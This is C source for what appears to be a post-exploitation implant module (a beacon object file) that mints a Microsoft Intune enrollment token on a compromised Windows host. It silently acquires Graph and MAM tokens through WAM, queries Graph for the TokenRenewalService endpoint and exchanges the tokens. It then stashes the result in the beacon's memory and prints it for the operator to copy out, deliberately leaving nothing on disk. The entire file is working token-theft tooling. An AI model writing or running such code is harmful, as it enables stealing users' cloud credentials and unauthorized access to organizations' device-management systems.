/* ime_token.c — mint the Intune enrollment token in-beacon.
 *
 *   ime_token
 *
 * Port of the IMEClient token chain: WAM silent graph token ->
 * GET graph servicePrincipals endpoints (providerName TokenRenewalService) ->
 * WAM silent MAM token -> GET <renewal>?api-version=1.0 -> Result.Token.
 * The token goes to the beacon KV "imeToken" (imectx.h) and is printed
 * (JWT = ASCII, no base64) for copy-out. Nothing is written to disk.
 */
#include "bofapi.h"
#include "imectx.h"
#include "ime_util.h"
#include "ime_api.h"
#include "wam.h"
#include "http.h"
#include "print.h"
#include "../common/strutil.h"

#define TOKEN_MAX 8192
#define URL_MAX   512

/* graph servicePrincipals endpoints, Intune app (IntuneRestClient.cs:106) */
static const wchar_t GRAPH_EP[] =
    L"https://graph.microsoft.com/v1.0/myorganization/servicePrincipals/"
    L"appId=0000000a-0000-0000-c000-000000000000/endpoints";
static const wchar_t GRAPH_SCOPE[] = L"https://graph.microsoft.com/.default";
/* IntuneMAMResourceId (IntuneRestClient.cs:16) */
static const wchar_t MAM_SCOPE[] =
    L"d4ebce55-015a-49b5-a083-c84d1797ae8c/.default";

static wchar_t *bearer_header(const wchar_t *tok)
{
    wchar_t *h = str_cat(L"Authorization: Bearer ", tok);
    wchar_t *h2;
    if (!h)
        return 0;
    h2 = str_cat(h, L"\r\nAccept: application/json\r\n");
    mem_free(h);
    return h2;
}

/* one WAM run with the standard failure line; 0 on success */
static int wam_step_hr(const char *who, const wchar_t *scope, wchar_t **out)
{
    int step = 0;
    unsigned long hr = 0;
    int rc = wam_acquire(scope, out, &step, &hr);
    if (rc != WAM_OK) {
        internal_printf("%s: wam silent token failed (step %d hr %08lx)\n",
                        who, step, hr);
        printoutput(CALLBACK_ERROR);
    }
    return rc;
}

void go(char *args, int len)
{
    ime_tok *blk;
    wchar_t *gtok = 0, *mtok = 0, *renew_w = 0, *iw_w = 0, *url2 = 0, *hdr = 0, *wtok = 0;
    char *body = 0, *tok8 = 0;
    char renew[URL_MAX], iwsvc[URL_MAX], pn[64];
    DWORD status = 0;
    int rc, tlen = 0;
    json_span sp;
    json_iter it;
    void *old;
    int found = 0;

    (void)args;
    (void)len;

    /* 1. graph token for the endpoint discovery */
    if (wam_step_hr("ime_token", GRAPH_SCOPE, &gtok))
        return;

    /* 2. endpoints -> TokenRenewalService uri */
    hdr = bearer_header(gtok);
    if (!hdr) {
        internal_printf("ime_token: out of memory");
        printoutput(CALLBACK_ERROR);
        goto out;
    }
    rc = http_json(HTTP_GET, GRAPH_EP, hdr, 0, &body, &status);
    mem_free(hdr);
    hdr = 0;
    if (rc == HTTP_FAIL || !body) {
        internal_printf("ime_token: graph endpoints request failed");
        printoutput(CALLBACK_ERROR);
        goto out;
    }
    if (rc != HTTP_OK) {
        ime_http_error("ime_token", status, body);
        goto out;
    }

    renew[0] = 0;
    iwsvc[0] = 0;
    it.began = it.pos = it.started = 0;
    while (json_array_iter(body, su_len(body), "value", &it, &sp)) {
        if (ime_json_str(sp.p, sp.len, "providerName", pn,
                         (int)sizeof(pn)) < 0)
            continue;
        /* no break: the entries' order is not ours to assume */
        if (!iwsvc[0] && su_ci_eq(pn, "IWService")) {
            if (ime_json_str(sp.p, sp.len, "uri", iwsvc,
                             (int)sizeof(iwsvc)) < 0)
                iwsvc[0] = 0;
        } else if (!found && su_ci_eq(pn, "TokenRenewalService")) {
            if (ime_json_str(sp.p, sp.len, "uri", renew, (int)sizeof(renew)) < 0)
                renew[0] = 0;
            found = 1;
        }
    }
    mem_free(body);
    body = 0;
    if (!found || !renew[0]) {
        internal_printf("ime_token: no TokenRenewalService endpoint in graph "
                        "response");
        printoutput(CALLBACK_ERROR);
        goto out;
    }
    if (utf8_to_utf16(renew, -1, &renew_w) < 0 || !renew_w) {
        internal_printf("ime_token: renewal url conversion failed");
        printoutput(CALLBACK_ERROR);
        goto out;
    }
    if (iwsvc[0] &&
        (utf8_to_utf16(iwsvc, -1, &iw_w) < 0 || !iw_w)) {
        iw_w = 0; /* best-effort: auth falls back to imeCtx without it */
    }
    url2 = str_cat(renew_w, L"?api-version=1.0");
    if (!url2) {
        internal_printf("ime_token: out of memory");
        printoutput(CALLBACK_ERROR);
        goto out;
    }

    /* 3. MAM token for the renewal call */
    if (wam_step_hr("ime_token", MAM_SCOPE, &mtok))
        goto out;

    /* 4. renewal exchange -> Result.Token */
    hdr = bearer_header(mtok);
    if (!hdr) {
        internal_printf("ime_token: out of memory");
        printoutput(CALLBACK_ERROR);
        goto out;
    }
    rc = http_json(HTTP_GET, url2, hdr, 0, &body, &status);
    mem_free(hdr);
    hdr = 0;
    if (rc == HTTP_FAIL || !body) {
        internal_printf("ime_token: renewal request failed (%s)", renew);
        printoutput(CALLBACK_ERROR);
        goto out;
    }
    if (rc != HTTP_OK) {
        ime_http_error("ime_token", status, body);
        goto out;
    }
    if (!json_find(body, su_len(body), "Result", &sp)) {
        internal_printf("ime_token: no Result in renewal response");
        printoutput(CALLBACK_ERROR);
        goto out;
    }
    tok8 = (char *)mem_alloc((size_t)TOKEN_MAX);
    if (!tok8) {
        internal_printf("ime_token: out of memory");
        printoutput(CALLBACK_ERROR);
        goto out;
    }
    tlen = ime_json_str(sp.p, sp.len, "Token", tok8, TOKEN_MAX);
    if (tlen <= 0) {
        internal_printf("ime_token: no Token in renewal result");
        printoutput(CALLBACK_ERROR);
        goto out;
    }
    if (utf8_to_utf16(tok8, tlen, &wtok) < 0 || !wtok) {
        internal_printf("ime_token: token conversion failed");
        printoutput(CALLBACK_ERROR);
        goto out;
    }

    /* 5. beacon KV, never-freed convention (imectx.h) */
    blk = (ime_tok *)mem_alloc(sizeof(ime_tok));
    if (!blk) {
        internal_printf("ime_token: out of memory");
        printoutput(CALLBACK_ERROR);
        goto out;
    }
    blk->magic = IME_TOK_MAGIC;
    blk->ver = IME_TOK_VER;
    blk->token = wtok;
    blk->iwurl = iw_w ? iw_w : str_dup(L"");
    old = BeaconGetValue((char *)IME_TOK_KEY);
    if (old)
        BeaconRemoveValue((char *)IME_TOK_KEY);
    if (!BeaconAddValue((char *)IME_TOK_KEY, blk)) {
        internal_printf("ime_token: BeaconAddValue failed");
        printoutput(CALLBACK_ERROR);
        goto out;
    }

    internal_printf("ime_token: enrollment token (%d chars, renewal %s)\n"
                    "iwurl %s\n"
                    "%s\n"
                    "stored in beacon KV 'imeToken' - refresh imeCtx with: "
                    "ime-auth\n",
                    tlen, renew, iwsvc, tok8);
    printoutput(CALLBACK_OUTPUT);

out:
    mem_free(gtok);
    mem_free(mtok);
    mem_free(renew_w);
    /* iw_w: on the success path it lives in the KV block (never-freed
     * convention); on failure paths it is a plain leak of one URL */
    mem_free(url2);
    mem_free(hdr);
    mem_free(body);
    mem_free(tok8);
}
